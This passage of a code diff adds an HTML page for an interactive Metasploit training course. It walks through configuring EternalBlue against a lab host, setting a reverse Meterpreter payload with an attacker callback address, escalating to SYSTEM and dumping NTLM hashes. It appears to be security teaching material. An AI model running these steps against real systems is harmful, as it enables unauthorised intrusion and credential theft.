+      <div class="hint-box" id="h-3-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-3-2">
+      <div class="ch-head"><div class="ch-title">CH 3.2 — Read the module info</div><div class="ch-status" id="st-3-2">unsolved</div></div>
+      <div class="ch-task">Print the full description, references, and supported targets for the loaded module.</div>
+      <div class="ch-scenario">Always read this before firing. References point you at the original CVE / advisory if anything goes weird.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-3-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-3-2"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-3-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('3-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('3-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('3-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-3-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-3-3">
+      <div class="ch-head"><div class="ch-title">CH 3.3 — List the options</div><div class="ch-status" id="st-3-3">unsolved</div></div>
+      <div class="ch-task">List every option this module accepts so you can see what's required and what's optional.</div>
+      <div class="ch-scenario">Required options have <code>yes</code> in the Required column. Anything missing a current setting that's required will block <code>exploit</code> from running.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-3-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-3-3"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-3-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('3-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('3-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('3-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-3-3"></div>
+    </div>
+
+    <div class="challenge" id="ch-3-4">
+      <div class="ch-head"><div class="ch-title">CH 3.4 — Set the target host</div><div class="ch-status" id="st-3-4">unsolved</div></div>
+      <div class="ch-task">Set the target to <span class="target">10.10.10.5</span>. The required option for "the host you want to attack" is named <code>RHOSTS</code>.</div>
+      <div class="ch-scenario">RHOSTS = "Remote Host(S)". Plural because it can take a single IP, a range (<code>10.10.10.0/24</code>), or a file (<code>file:targets.txt</code>).</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-3-4"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-3-4"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-3-4" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('3-4',1)">Hint 1</button><button class="hint-btn" onclick="hint('3-4',2)">Hint 2</button><button class="hint-btn" onclick="hint('3-4',3)">Reveal</button></div>
+      <div class="hint-box" id="h-3-4"></div>
+    </div>
+
+    <h2 id="mod-4"><span class="num">04</span>Payloads explained</h2>
+    <p class="lead">// the part you actually send — and why picking the right one matters</p>
+    <p>An exploit is the <em>delivery mechanism</em>. The <strong>payload</strong> is what runs on the target after the exploit lands. Pick the wrong payload and you either get nothing (a session that dies in 30 seconds), or you get a basic shell when you could have had a Meterpreter — losing 90% of your post-ex capability.</p>
+    <div class="concept">
+      <div class="label">→ The three big payload axes</div>
+      <p><strong>Reverse vs Bind:</strong> Reverse = target connects back to you (works through NAT/firewalls). Bind = target opens a port and you connect to it (almost always blocked by firewalls). <em>Default to reverse.</em></p>
+      <p><strong>Staged vs Stageless:</strong> Staged splits the payload into a tiny initial dropper plus a second-stage download — small footprint, two network connections. Stageless ships the full payload at once — bigger but more reliable through fragile shells.</p>
+      <p><strong>Shell vs Meterpreter:</strong> Shell = a regular OS command prompt. Meterpreter = an in-memory framework with file transfer, screenshot, hash dump, pivoting, lateral commands. <em>Always prefer Meterpreter when available.</em></p>
+    </div>
+    <h3>Reading payload paths</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Path</th><th>Decoded</th></tr></thead>
+      <tbody>
+        <tr><td><code>windows/x64/meterpreter/reverse_tcp</code></td><td>Windows, 64-bit, Meterpreter, reverse TCP, staged. The default for most modern Windows exploits.</td></tr>
+        <tr><td><code>windows/x64/meterpreter_reverse_tcp</code></td><td>Same idea, but <em>stageless</em> — note underscore instead of slash before <code>reverse_tcp</code>. One transfer, larger payload.</td></tr>
+        <tr><td><code>linux/x64/meterpreter/reverse_tcp</code></td><td>Linux Meterpreter — yes, it exists; not just Windows.</td></tr>
+        <tr><td><code>cmd/unix/reverse_bash</code></td><td>Just a bash one-liner reverse shell. No framework, no fancy commands. Use when target is a constrained appliance.</td></tr>
+        <tr><td><code>generic/shell_reverse_tcp</code></td><td>Generic shell over reverse TCP. Falls back to whatever the target offers (cmd.exe, /bin/sh).</td></tr>
+      </tbody>
+    </table></div>
+    <h3>Key payload options</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Option</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>LHOST</code></td><td>"Listen Host" — your attacker IP. The target will connect <em>to this</em>. Common bug: setting this to <code>127.0.0.1</code> by accident — the target can't reach your loopback.</td></tr>
+        <tr><td><code>LPORT</code></td><td>"Listen Port" — what port your handler listens on. Defaults to <code>4444</code>. Pick a port your firewall allows outbound; <code>443</code> often gets through restrictive egress.</td></tr>
+        <tr><td><code>set payload &lt;path&gt;</code></td><td>Switch the payload from the default. Always tab-complete or copy-paste — the paths are long.</td></tr>
+        <tr><td><code>show payloads</code></td><td>Lists every payload <em>compatible with the loaded exploit</em>. Don't pick a Linux payload for a Windows exploit.</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>The number-one reason "the exploit ran but I didn't get a session" is a payload misconfig: LHOST set to your hostname instead of your IP, LHOST set to a NAT'd address the target can't reach, or LPORT blocked outbound from the target's network. Spend 30 seconds confirming your payload before firing.</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Listing compatible payloads, switching to a stageless variant, setting LHOST/LPORT.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · payload selection</div></div>
+      <div class="term-body" id="demo-4"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-4', demos.d4)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-4-1">
+      <div class="ch-head"><div class="ch-title">CH 4.1 — List compatible payloads</div><div class="ch-status" id="st-4-1">unsolved</div></div>
+      <div class="ch-task">EternalBlue is loaded. List every payload that's compatible with it.</div>
+      <div class="ch-scenario">You want to confirm a 64-bit Meterpreter is available before continuing.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-4-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-4-1"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-4-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('4-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('4-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('4-1',3)">Reveal</button></div>
+      <div class="hint-box" id="h-4-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-4-2">
+      <div class="ch-head"><div class="ch-title">CH 4.2 — Set a 64-bit Meterpreter reverse TCP</div><div class="ch-status" id="st-4-2">unsolved</div></div>
+      <div class="ch-task">Set the payload to <span class="target">windows/x64/meterpreter/reverse_tcp</span>.</div>
+      <div class="ch-scenario">This is the most common Metasploit payload in the wild — staged, 64-bit, full Meterpreter feature set.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-4-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-4-2"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-4-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('4-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('4-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('4-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-4-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-4-3">
+      <div class="ch-head"><div class="ch-title">CH 4.3 — Set your listening IP</div><div class="ch-status" id="st-4-3">unsolved</div></div>
+      <div class="ch-task">Your tunneled VPN gives you the address <span class="target">10.10.14.2</span>. Set LHOST so the reverse Meterpreter connects back to you.</div>
+      <div class="ch-scenario">If you set this to <code>127.0.0.1</code> or your hostname, the target can't reach you and the session never opens.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-4-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-4-3"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-4-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('4-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('4-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('4-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-4-3"></div>
+    </div>
+
+    <h2 id="mod-5"><span class="num">05</span>Firing the exploit</h2>
+    <p class="lead">// check, exploit, sessions — the actual moment of compromise</p>
+    <p>Everything so far has been setup. Now you fire. The professional move is always <code>check</code> first, then <code>exploit</code>. The <code>check</code> command runs a non-destructive probe to confirm the target is actually vulnerable — if you skip it, you might be wasting time on a target that's been patched.</p>
+    <div class="concept">
+      <div class="label">→ check vs exploit</div>
+      <p><strong>check</strong> — sends harmless probes. Result: <em>vulnerable / not vulnerable / appears unexploitable / detection unavailable</em>. Not every module supports it.</p>
+      <p><strong>exploit</strong> (or <code>run</code> — same thing) — actually fires. If everything's set up correctly, you get a session. If options are missing, the framework refuses and tells you what's wrong.</p>
+    </div>
+    <h3>Command anatomy</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>check</code></td><td>Probe target without exploiting. Best practice before <code>exploit</code>.</td></tr>
+        <tr><td><code>exploit</code> / <code>run</code></td><td>Fire the module. <code>run</code> is an alias — they're identical.</td></tr>
+        <tr><td><code>exploit -j</code></td><td>Run as a background job. Handler stays up after session opens — needed for multiple sessions or to keep listening.</td></tr>
+        <tr><td><code>exploit -z</code></td><td>Don't auto-interact with the new session. Pairs with <code>-j</code> for hands-off automation.</td></tr>
+        <tr><td><code>jobs</code></td><td>List running background jobs.</td></tr>
+        <tr><td><code>jobs -k &lt;id&gt;</code></td><td>Kill a job by ID.</td></tr>
+        <tr><td><code>sessions</code> / <code>sessions -l</code></td><td>List active sessions you've opened. Each gets a numeric ID.</td></tr>
+        <tr><td><code>sessions -i &lt;id&gt;</code></td><td>Interact with session N — drops you into Meterpreter or shell.</td></tr>
+        <tr><td><code>sessions -K</code></td><td>Kill all sessions. Capital K. Useful at end-of-engagement.</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>Without <code>-j</code>, your exploit ties up the foreground. If you want to launch a second exploit while the first is still serving sessions — a multi-host engagement — you need background jobs. Likewise, the difference between <code>sessions -i 1</code> and <code>sessions 1</code> is the difference between "this works" and "syntax error."</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Running check, then exploit, then dropping into the resulting Meterpreter session.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · the actual exploit</div></div>
+      <div class="term-body" id="demo-5"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-5', demos.d5)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-5-1">
+      <div class="ch-head"><div class="ch-title">CH 5.1 — Check before firing</div><div class="ch-status" id="st-5-1">unsolved</div></div>
+      <div class="ch-task">EternalBlue is fully configured against 10.10.10.5. Confirm the target is actually vulnerable before you exploit.</div>
+      <div class="ch-scenario">A "check" returns vulnerable / not vulnerable without crashing the box. You always do this first on production-like targets.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-5-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-5-1"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-5-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('5-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('5-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('5-1',3)">Reveal</button></div>
+      <div class="hint-box" id="h-5-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-5-2">
+      <div class="ch-head"><div class="ch-title">CH 5.2 — Fire the exploit as a background job</div><div class="ch-status" id="st-5-2">unsolved</div></div>
+      <div class="ch-task">Run the exploit, but as a background job so the handler stays alive and you keep the prompt available.</div>
+      <div class="ch-scenario">During an engagement you almost always want this — a foreground exploit blocks you from doing anything else until you manually background it.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-5-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-5-2"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-5-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('5-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('5-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('5-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-5-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-5-3">
+      <div class="ch-head"><div class="ch-title">CH 5.3 — Interact with session 1</div><div class="ch-status" id="st-5-3">unsolved</div></div>
+      <div class="ch-task">Your exploit opened Meterpreter session 1. Interact with it — drop into the Meterpreter prompt.</div>
+      <div class="ch-scenario">Backgrounded sessions don't auto-attach. You have to <em>interact</em> with them by ID.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-5-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-5-3"><span class="term-msf">msf6</span> <span class="term-msf-mod">exploit(windows/smb/ms17_010_eternalblue)</span> &gt;</span><input class="term-input" id="i-5-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('5-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('5-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('5-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-5-3"></div>
+    </div>
+
+    <h2 id="mod-6"><span class="num">06</span>Meterpreter post-exploitation</h2>
+    <p class="lead">// you have a session — now what</p>
+    <p><strong>Meterpreter</strong> is an in-memory framework that runs entirely as a thread inside a hijacked process. It never touches disk. It speaks an encrypted protocol back to your handler. And it ships with dozens of commands for reconnaissance, file transfer, lateral movement, and credential theft.</p>
+    <div class="concept">
+      <div class="label">→ The first 60 seconds inside</div>
+      <p>When a session opens, the first questions are always: <strong>Where am I?</strong> (<code>sysinfo</code>) — <strong>Who am I?</strong> (<code>getuid</code>) — <strong>What's running here?</strong> (<code>ps</code>) — <strong>Can I become SYSTEM?</strong> (<code>getsystem</code>). Build that muscle memory; it's the core of every post-ex flow.</p>
+    </div>
+    <h3>Command anatomy — Meterpreter essentials</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>sysinfo</code></td><td>Computer name, OS, build, architecture, domain. First thing you run.</td></tr>
+        <tr><td><code>getuid</code></td><td>Username Meterpreter is running as. <code>NT AUTHORITY\SYSTEM</code> = jackpot. <code>WORKGROUP\IUSR_X</code> = web shell, you have work to do.</td></tr>
+        <tr><td><code>getpid</code></td><td>Process ID Meterpreter is currently injected into.</td></tr>
+        <tr><td><code>ps</code></td><td>List running processes. Used to find a target to migrate into or processes to kill.</td></tr>
+        <tr><td><code>migrate &lt;pid&gt;</code></td><td>Move Meterpreter into another process. Useful if your current host process might die.</td></tr>
+        <tr><td><code>getsystem</code></td><td>Try several local-privilege-escalation techniques to become SYSTEM.</td></tr>
+        <tr><td><code>hashdump</code></td><td>Dump local SAM hashes. Requires SYSTEM privs. Output: <em>username:RID:LM:NTLM:::</em></td></tr>
+        <tr><td><code>screenshot</code></td><td>Grab a screenshot from the active console session. Saved to your Kali home dir.</td></tr>
+        <tr><td><code>shell</code></td><td>Drop to a regular cmd.exe / /bin/sh. Type <code>exit</code> to come back to Meterpreter.</td></tr>
+        <tr><td><code>upload &lt;src&gt; &lt;dst&gt;</code></td><td>Push a file from Kali to the target.</td></tr>
+        <tr><td><code>download &lt;path&gt;</code></td><td>Pull a file from target to Kali.</td></tr>
+        <tr><td><code>background</code></td><td>Push the current Meterpreter to the background — back to <code>msf6 ></code>. Session stays alive.</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>An unmigrated Meterpreter dies the second the user kills the exploited process. Forgetting <code>getsystem</code> means everything you do is constrained to the user you popped — including <code>hashdump</code>, which silently fails without SYSTEM. The order isn't arbitrary; it's the difference between a stable foothold and a session that vanishes mid-investigation.</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Inside a fresh Meterpreter — sysinfo, getuid, ps, hashdump.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · post-exploitation</div></div>
+      <div class="term-body" id="demo-6"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-6', demos.d6)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-6-1">
+      <div class="ch-head"><div class="ch-title">CH 6.1 — Identify the target</div><div class="ch-status" id="st-6-1">unsolved</div></div>
+      <div class="ch-task">You just landed in a Meterpreter session. First question: what OS are you on, what version, what architecture?</div>
+      <div class="ch-scenario">This always runs first. Everything else depends on it — payload selection, escalation technique, even which post-modules to use.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">meterpreter session 1</div></div>
+        <div class="term-body" id="t-6-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-6-1"><span class="term-meter">meterpreter</span> &gt;</span><input class="term-input" id="i-6-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('6-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('6-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('6-1',3)">Reveal</button></div>
+      <div class="hint-box" id="h-6-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-6-2">
+      <div class="ch-head"><div class="ch-title">CH 6.2 — Check your privilege level</div><div class="ch-status" id="st-6-2">unsolved</div></div>
+      <div class="ch-task">Find out which user account Meterpreter is currently running as.</div>
+      <div class="ch-scenario">If you're already SYSTEM, you skip privilege escalation. If you're <code>NT AUTHORITY\NETWORK SERVICE</code>, you have escalation work ahead.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">meterpreter session 1</div></div>
+        <div class="term-body" id="t-6-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-6-2"><span class="term-meter">meterpreter</span> &gt;</span><input class="term-input" id="i-6-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('6-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('6-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('6-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-6-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-6-3">
+      <div class="ch-head"><div class="ch-title">CH 6.3 — Try to escalate to SYSTEM</div><div class="ch-status" id="st-6-3">unsolved</div></div>
+      <div class="ch-task">You're running as a standard user. Use Meterpreter's built-in escalation to attempt to become SYSTEM.</div>
+      <div class="ch-scenario">There's a single command that auto-tries multiple known LPE techniques.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">meterpreter session 1</div></div>
+        <div class="term-body" id="t-6-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-6-3"><span class="term-meter">meterpreter</span> &gt;</span><input class="term-input" id="i-6-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('6-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('6-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('6-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-6-3"></div>
+    </div>
+
+    <div class="challenge" id="ch-6-4">
+      <div class="ch-head"><div class="ch-title">CH 6.4 — Dump the local hashes</div><div class="ch-status" id="st-6-4">unsolved</div></div>
+      <div class="ch-task">Now that you're SYSTEM, dump every local user's NTLM hash from the SAM database.</div>
+      <div class="ch-scenario">These hashes feed straight into hashcat for cracking, or into pass-the-hash for lateral movement to other Windows boxes.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">meterpreter session 1 (SYSTEM)</div></div>
+        <div class="term-body" id="t-6-4"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-6-4"><span class="term-meter">meterpreter</span> &gt;</span><input class="term-input" id="i-6-4" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('6-4',1)">Hint 1</button><button class="hint-btn" onclick="hint('6-4',2)">Hint 2</button><button class="hint-btn" onclick="hint('6-4',3)">Reveal</button></div>
+      <div class="hint-box" id="h-6-4"></div>
+    </div>
+
+    <h2 id="mod-7"><span class="num">07</span>Database & workspaces</h2>
+    <p class="lead">// remember everything you've found, separately per engagement</p>
+    <p>Metasploit can hook into a PostgreSQL database that automatically tracks every host, service, vuln, and credential it touches. Across a multi-day engagement, this is the difference between scrolling through scrollback and a queryable record of everything found. Workspaces let you segment data per engagement so customer A doesn't bleed into customer B.</p>
+    <div class="concept">
+      <div class="label">→ Why bother with the DB</div>
+      <p>Run <code>db_nmap -sV 10.10.10.0/24</code> instead of plain <code>nmap</code>. Same scan — but every host found, every port, every service banner gets stored. Two days later you can <code>services -p 445 -R</code> to <em>list every host with SMB open and pre-fill RHOSTS for the next exploit</em>. The DB turns recon into automation.</p>
+    </div>
+    <h3>Command anatomy — db & workspace</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>db_status</code></td><td>Confirm the DB is connected. <em>Connected to msf. Connection type: postgresql.</em> = good.</td></tr>
+        <tr><td><code>workspace</code></td><td>List workspaces. The active one has a <code>*</code> next to it.</td></tr>
+        <tr><td><code>workspace -a &lt;name&gt;</code></td><td>Add a new workspace. Switches to it automatically.</td></tr>
+        <tr><td><code>workspace &lt;name&gt;</code></td><td>Switch to an existing workspace.</td></tr>
+        <tr><td><code>workspace -d &lt;name&gt;</code></td><td>Delete a workspace and all its data.</td></tr>
+        <tr><td><code>db_nmap [opts] &lt;target&gt;</code></td><td>Run nmap and ingest results. Same flags as real nmap (<code>-sV -p- -A</code>).</td></tr>
+        <tr><td><code>hosts</code></td><td>List every host stored in current workspace.</td></tr>
+        <tr><td><code>services</code> / <code>services -p 80</code></td><td>List services. <code>-p</code> filters by port.</td></tr>
+        <tr><td><code>services -p 445 -R</code></td><td>The <code>-R</code> flag pipes the host list straight into <code>RHOSTS</code> for whatever module you have loaded.</td></tr>
+        <tr><td><code>vulns</code></td><td>List known vulnerabilities discovered (auto-populated by some scanners).</td></tr>
+        <tr><td><code>creds</code></td><td>List captured credentials. Auto-populated by hashdump, login bruteforcers, etc.</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>Once you've worked with the DB, going back to plain <code>nmap</code> + scrollback feels like coding without source control. It's not just storage — it's the <code>-R</code> chain that lets you do <code>db_nmap → services -p 445 -R → exploit</code> as one fluid motion across dozens of hosts.</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Setting up a workspace, running db_nmap, querying services and using -R.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · db workflow</div></div>
+      <div class="term-body" id="demo-7"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-7', demos.d7)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-7-1">
+      <div class="ch-head"><div class="ch-title">CH 7.1 — Confirm the database is connected</div><div class="ch-status" id="st-7-1">unsolved</div></div>
+      <div class="ch-task">Before you trust any data store/query commands, confirm msfconsole is hooked into PostgreSQL.</div>
+      <div class="ch-scenario">If the DB isn't running, every <code>db_*</code> and <code>workspace</code> command silently does nothing useful.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-7-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-7-1"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-7-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('7-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('7-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('7-1',3)">Reveal</button></div>
+      <div class="hint-box" id="h-7-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-7-2">
+      <div class="ch-head"><div class="ch-title">CH 7.2 — Create a new workspace</div><div class="ch-status" id="st-7-2">unsolved</div></div>
+      <div class="ch-task">You're starting an engagement for client "AcmeCorp". Create and switch to a workspace named <span class="target">acme</span>.</div>
+      <div class="ch-scenario">Single command — adds and switches in one shot.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-7-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-7-2"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-7-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('7-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('7-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('7-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-7-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-7-3">
+      <div class="ch-head"><div class="ch-title">CH 7.3 — Scan the subnet into the DB</div><div class="ch-status" id="st-7-3">unsolved</div></div>
+      <div class="ch-task">Scan the <span class="target">10.10.10.0/24</span> subnet with version detection enabled, and store every result in the active workspace.</div>
+      <div class="ch-scenario">You want service banners (<code>-sV</code>) so you can tell which ports run what software, not just which ports are open.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-7-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-7-3"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-7-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('7-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('7-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('7-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-7-3"></div>
+    </div>
+
+    <h2 id="mod-8"><span class="num">08</span>Auxiliary scanners</h2>
+    <p class="lead">// recon and enumeration without exploitation</p>
+    <p>Not everything in Metasploit is an exploit. The <strong>auxiliary</strong> category contains scanners, login bruteforcers, fingerprinters, and information-gathering modules. They use the same four-step loop as exploits — <code>use</code>, <code>show options</code>, <code>set</code>, <code>run</code> — but they don't try to compromise anything. They just collect.</p>
+    <div class="concept">
+      <div class="label">→ When auxiliary beats nmap</div>
